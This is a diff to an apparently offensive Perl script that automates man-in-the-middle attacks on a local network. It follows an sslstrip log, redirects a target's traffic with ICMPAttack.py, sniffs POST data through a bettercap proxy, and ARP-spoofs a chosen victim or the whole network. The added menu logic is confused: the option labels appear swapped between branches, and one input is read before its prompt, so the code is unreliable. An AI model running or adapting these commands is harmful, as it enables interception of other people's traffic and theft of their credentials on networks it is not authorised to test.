@@ -131,7 +131,7 @@ print "Enter name of file end with .log\n";
 # start following the sslstrip log using tail
 my $tail;
 print "[ + ] Do you want to start to follow the log file in real time? (y/n): ";
-    $tail=<STDIN&>;
+    $tail=<STDIN>;
     chomp($tail);    
     if ($tail eq "y"){
         print "[ + ] Starting to tail the sslstrip log file.\n";
@@ -142,6 +142,16 @@ print "[ + ] Do you want to start to follow the log file in real time? (y/n): ";
     }
 
 
+# choice selector for arp spoof or blinder
+my $options;
+my $arp;
+            print "[ + ] Option 1 - Start ARP Spoof, type: arpspoof\n [ + ] Option 2 - Start Blinder, type: blinder\n";
+            $options=<STDIN>;
+            chomp($options);
+	    $arp=<STDIN>;
+    	    chomp($arp);
+
+        if ($options eq "arpspoof") 					{
 # start blind traffic hijacker
 my $blindarp;
 my $target;
@@ -155,22 +165,38 @@ print "[ + ] Enter Gateway? (y/n)\n";
 print "[ + ] Do you want to start a blind attack? (y/n): ";
     $blindarp=<STDIN>;
     chomp($blindarp);
-        if ($blindarp eq "y"){
+        if ($blindarp eq "y")					{
             print "[ + ] Enter the IP of the Target: ";
             $target=<STDIN>;
             chomp($target);
-			     }
+			     					}
             print "[ + ] Option 1 - Redirect victim traffic to localhost\n [ + ] Option 2 - Redirect victim traffic to localhost and use bettercap\n [ + ] Option 3 - Hack target traffic using bettercap";
             $option=<STDIN>;
             chomp($option);
-        if ($option eq "1") {
+        if ($option eq "1") 					{
                 system ("sudo python ICMPAttack.py -v -i $interface -g $gateway -t $target");
-			    } 
-elsif($option eq "2") {
+			    					} 
+elsif($option eq "2") 						{
                 system ("sudo python ICMPAttack.py -v -i $interface -g $gateway -t $target && bettercap -t $localhost --proxy -P POST"); 
-		      } 
-elsif($option eq "3") {
+		      						} 
+elsif($option eq "3") 						{
                 system ("sudo bettercap -t $target --proxy -P POST");
-	              }
-else {}
+	              						}
+							  }
+elsif($options eq "blinder") 					{
+my $target;
+# start arpspoof; option to spoof a target or spoof the entire network
+print "[ + ] Do you want to spoof a specific target? (y/n): ";
+#    $arp=<STDIN>;
+#    chomp($arp);
+        if ($arp eq "y")					{
+            print "[ + ] Enter the IP of the Target: \n";
+            $target=<STDIN>;
+            chomp($target);
+                system ("xterm -e sudo arpspoof -i $interface -t $target $default");
+        							}
+        else 							{
+            system ("xterm -e sudo arpspoof -i $interface $default");
+        							}
+}
 print color('reset');
